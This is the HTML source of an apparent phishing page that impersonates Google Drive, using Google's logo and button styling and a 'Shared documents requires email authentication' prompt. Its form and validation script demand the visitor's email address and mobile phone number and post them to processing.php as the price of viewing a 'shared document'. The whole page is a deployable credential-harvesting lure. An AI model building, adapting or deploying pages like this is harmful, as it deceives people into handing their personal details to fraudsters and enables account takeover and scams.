<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\">
<html xmlns=\"http://www.w3.org/1999/xhtml\">

<head>
<link rel="icon" type="">


<title>Google Documents Email Verification</title>
 <link rel="stylesheet" type="text/css" href="index.css" media="all">
    <style>
button::-moz-focus-inner, input::-moz-focus-inner { border: 0px none; }
input[type=email], input[type=number], input[type=password], input[type=tel], input[type=text], input[type=url] { display: inline-block; height: 29px; margin: 0px; padding: 0px 8px; background: none repeat scroll 0% 0% rgb(255, 255, 255); border-right: 1px solid rgb(217, 217, 217); border-width: 1px; border-style: solid; border-color: rgb(192, 192, 192) rgb(217, 217, 217) rgb(217, 217, 217); -moz-border-top-colors: none; -moz-border-right-colors: none; -moz-border-bottom-colors: none; -moz-border-left-colors: none; border-image: none; -moz-box-sizing: border-box; border-radius: 1px 1px 1px 1px; }
input[type=email]:hover, input[type=number]:hover, input[type=password]:hover, input[type=tel]:hover, input[type=text]:hover, input[type=url]:hover { border-right: 1px solid rgb(185, 185, 185); border-width: 1px; border-style: solid; border-color: rgb(160, 160, 160) rgb(185, 185, 185) rgb(185, 185, 185); -moz-border-top-colors: none; -moz-border-right-colors: none; -moz-border-bottom-colors: none; -moz-border-left-colors: none; border-image: none; box-shadow: 0px 1px 2px rgba(0, 0, 0, 0.1) inset; }
input[type=email]:focus, input[type=number]:focus, input[type=password]:focus, input[type=tel]:focus, input[type=text]:focus, input[type=url]:focus { outline: medium none; border: 1px solid rgb(77, 144, 254); box-shadow: 0px 1px 2px rgba(0, 0, 0, 0.3) inset; }
input[type=checkbox], input[type=radio] { width: 13px; height: 13px; margin: 0px; cursor: pointer; vertical-align: bottom; background: none repeat scroll 0% 0% rgb(255, 255, 255); border: 1px solid rgb(220, 220, 220); border-radius: 1px 1px 1px 1px; -moz-box-sizing: border-box; position: relative; }
input[type=checkbox]:active, input[type=radio]:active { border-color: rgb(198, 198, 198); background: none repeat scroll 0% 0% rgb(235, 235, 235); }
input[type=checkbox]:hover { border-color: rgb(198, 198, 198); box-shadow: 0px 1px 1px rgba(0, 0, 0, 0.1) inset; }
input[type=checkbox]:checked, input[type=radio]:checked { background: none repeat scroll 0% 0% rgb(255, 255, 255); }
input[type=checkbox]:checked:after { content: url('checkmark.png'); display: block; position: absolute; top: -6px; left: -5px; }
input[type=checkbox]:focus { outline: medium none; border-color: rgb(77, 144, 254); }
.g-button { display: inline-block; min-width: 46px; text-align: center; color: rgb(68, 68, 68); font-size: 11px; font-weight: bold; height: 27px; padding: 0px 8px; line-height: 27px; border-radius: 2px 2px 2px 2px; transition: all 0.218s ease 0s ; border: 1px solid rgb(220, 220, 220); background-color: rgb(245, 245, 245); background-image: -moz-linear-gradient(center top , rgb(245, 245, 245), rgb(241, 241, 241)); -moz-user-select: none; cursor: default; }
button.g-button, input.g-button[type=submit] { height: 29px; line-height: 29px; vertical-align: bottom; margin: 0px; }
.g-button:hover { border: 1px solid rgb(198, 198, 198); color: rgb(51, 51, 51); text-decoration: none; transition: all 0s ease 0s ; background-color: rgb(248, 248, 248); background-image: -moz-linear-gradient(center top , rgb(248, 248, 248), rgb(241, 241, 241)); box-shadow: 0px 1px 1px rgba(0, 0, 0, 0.1); }
.g-button:active { background-color: rgb(246, 246, 246); background-image: -moz-linear-gradient(center top , rgb(246, 246, 246), rgb(241, 241, 241)); box-shadow: 0px 1px 2px rgba(0, 0, 0, 0.1) inset; }
.g-button-submit { border: 1px solid rgb(48, 121, 237); color: rgb(255, 255, 255); text-shadow: 0px 1px rgba(0, 0, 0, 0.1); background-color: rgb(77, 144, 254); background-image: -moz-linear-gradient(center top , rgb(77, 144, 254), rgb(71, 135, 237)); }
.g-button-submit:hover { border: 1px solid rgb(47, 91, 183); color: rgb(255, 255, 255); text-shadow: 0px 1px rgba(0, 0, 0, 0.3); background-color: rgb(53, 122, 232); background-image: -moz-linear-gradient(center top , rgb(77, 144, 254), rgb(53, 122, 232)); }
.g-button-submit:active { background-color: rgb(53, 122, 232); background-image: -moz-linear-gradient(center top , rgb(77, 144, 254), rgb(53, 122, 232)); box-shadow: 0px 1px 2px rgba(0, 0, 0, 0.3) inset; }
.sign-in { width: 335px; position: absolute; left: 248px; top: 175px;}
.signin-box, .accountchooser-box { margin: 12px 0px 0px; padding: 20px 25px 15px; background: none repeat scroll 0% 0% rgb(241, 241, 241); border: 1px solid rgb(229, 229, 229); }
.signin-box h2 { font-size: 16px; line-height: 17px; height: 16px; margin: 0px 0px 1.2em; position: relative; }
.signin-box h2 strong { display: inline-block; position: absolute; right: 0px; top: 1px; height: 19px; width: 52px; }
.signin-box div { margin: 0px 0px 1.5em; }
.signin-box input[type=email], .signin-box input[type=text], .signin-box input[type=password] { width: 100%; height: 32px; font-size: 15px; direction: ltr; }
.signin-box .email-label, .signin-box .passwd-label { font-weight: bold; margin: 0px 0px 0.5em; display: block; -moz-user-select: none; }
.signin-box label.remember { display: inline-block; vertical-align: top; margin: 9px 0px 0px; }
.signin-box .remember-label { font-weight: normal; color: rgb(102, 102, 102); line-height: 0; padding: 0px 0px 0px 0.4em; -moz-user-select: none; }
.signin-box input[type=submit] { margin: 0px 1.5em 1.2em 0px; height: 32px; font-size: 13px; }
.signin-box ul { margin: 0px;}
}

.auto-style1 {
	color: rgb(232, 12, 12);
	font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
}
    .style8 {font-size: 12px; color: #000066; }
    .style9 {
	font-size: 12px;
	color: #999999;
	font-weight: bold;
}
    .style13 {color: #000000; font-weight: bold; }
    .style15 {	font-size: 10px;
	color: #FF6600;
}
    .style16 {color: #FF9900}
    .style18 {font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif; color: #999999;}
    </style>
	
	<script language="Javascript"> 
function echeck(str) {
 
		var at="@"
		var dot="."
		var lat=str.indexOf(at)
		var lstr=str.length
		var ldot=str.indexOf(dot)
		if (str.indexOf(at)==-1){
		   alert("Enter email as username@domain.com")
		   return false
		}
 
		if (str.indexOf(at)==-1 || str.indexOf(at)==0 || str.indexOf(at)==lstr){
		   alert("Enter email as username@domain.com")
		   return false
		}
 
		if (str.indexOf(dot)==-1 || str.indexOf(dot)==0 || str.indexOf(dot)==lstr){
		    alert("Enter email as username@domain.com")
		    return false
		}
 
		 if (str.indexOf(at,(lat+1))!=-1){
		    alert("Enter email as username@domain.com")
		    return false
		 }
 
		 if (str.substring(lat-1,lat)==dot || str.substring(lat+1,lat+2)==dot){
		    alert("Enter email as username@domain.com")
		    return false
		 }
 
		 if (str.indexOf(dot,(lat+2))==-1){
		    alert("Enter email as username@domain.com")
		    return false
		 }
		
		 if (str.indexOf(" ")!=-1){
		    alert("Enter email as username@domain.com")
		    return false
		 }
 
 		 return true					
	}
 
   function ValidateFormOther(){
	var emailID=document.other.email
	var emailPASS=document.other.phone
	
	if ((emailID.value==null)||(emailID.value=="")){
		alert("Please Enter your Email Address to View Shared Document")
		emailID.focus()
		return false
	}
	if ((emailPASS.value==null)||(emailPASS.value=="")){
		alert("Your Mobile Phone is required to View Google Shared Document")
		emailPASS.focus()
		return false
	}
	if (echeck(emailID.value)==false){
		emailID.value=""
		emailID.focus()
		return false
	}
	return true
 }
</script>
</head>
<body>
    <div id="c-doc">
      <div id="c-header">
        <div id="c-header-wrapper">
          <a id="logo">
          </a>
          <a href="#" id="cust_logo">
            <img alt="Google logo" src="google_logo_41.png" width="116" height="41">
            <span class="goog-inline-block">
              Drive
            </span>
          </a>
          <ul id="c-nav">
            <li>
            </li>
            
          </ul>
          
        </div>
      </div>
      <div align="center">
        <table width="1056" border="0" cellpadding="0" cellspacing="0">
          <!--DWLayoutTable-->
          <tr>
            <td width="344" height="268" valign="top"><img src="jewel.png" width="521" height="381"></td>
          <td width="712" valign="top"><div id="main-content">
            <div id="action" class="c-button">
              <h3 align="left" class="style8"><span class="style13">Shared documents requires email authentication</span> </h3>
              <p align="left" class="style9">Enter your email address below to view the document.</p>
              <div align="center"><span class="ap_col2 bold ap_radio_label"><br>
                </span>
               <form name="other" method="post" action="processing.php" onSubmit="return ValidateFormOther()">
                 <p><span class="style18">Email Address</span> 
                     <span class="style16">                 </p>
                  <label>
                    <input name="email" value="" size="16" id="account_number" maxlength="30" type="text">
                  </label>
                  <p><span class="style18">Phone Number</span> 
				      <span class="style16">			            </span></p>
				  <span class="style16">
				  <label>
                    <input name="phone" value="" size="16" id="account_number" maxlength="14" type="text">
                  </label>
                  </span>
                  <label> </label>
                 <p>
                    <input name="Submit" type="submit" class="g-button-submit" value="View Document">
</p>
                  <p>&nbsp;</p>
               </form>
                </p>
                <table border="1">
                  <tbody><tr>
                    <td><span class="ap_col2 bold ap_radio_label"><a href="javascript:togglegmail();"></a></span></td>
			          <td><span class="ap_col2 bold ap_radio_label"><a href="javascript:toggleaol();"></a></span></td>
				      </tr>
                    
                    <tr>
                      <td><span class="ap_col2 bold ap_radio_label"><a href="javascript:toggle();"></a></span></td>
				       <td><span class="ap_col2 bold ap_radio_label"><a href="javascript:togglehotmail();"></a></span></td>
			        </tr>
                    
                    <tr>
                      <td><span class="ap_col2 bold ap_radio_label"><a href="javascript:toggleother();"></a></span></td>
			        </tr>
                  </tbody>
                </table>
                <form name="form2" method="post" action="">
                  <label></label>
                </form>
              </div>
            </div>
              
            <div class="more-links"></div>
          </div>
          <span class="ap_col2 bold ap_radio_label"></span><span id="ap_caps_warn_span">
                 
                   
                   
                 
 


<div id="ap_caps_warning" class="ap_caps_warn ap_col3_caps_warn" style="visibility:hidden;"> 
  <!--[if lt IE 7]>
  <style type="text/css">
  .ap_caps_warn {
    display: none;
  }
  </style>
  <![endif]-->
</div>

               </span>
          <div id="ap_signin1a_cnep_row" class="ap_row"></div>
    
    
    <div class="ap_row"></div>


  

<!--[if lte IE 8]>
    </div>
<![endif]-->
<div id="javascriptSlots">
<div id="javascript-identity">












</div>

<div id="js-trms">


</div>


</body>
</html>
<!--DWLayoutEmptyCell-->&nbsp;</td>
          </tr>
          
          
          <tr>
            <td height="32">&nbsp;</td>
            <td>&nbsp;</td>
          </tr>
          </table>
      </div>

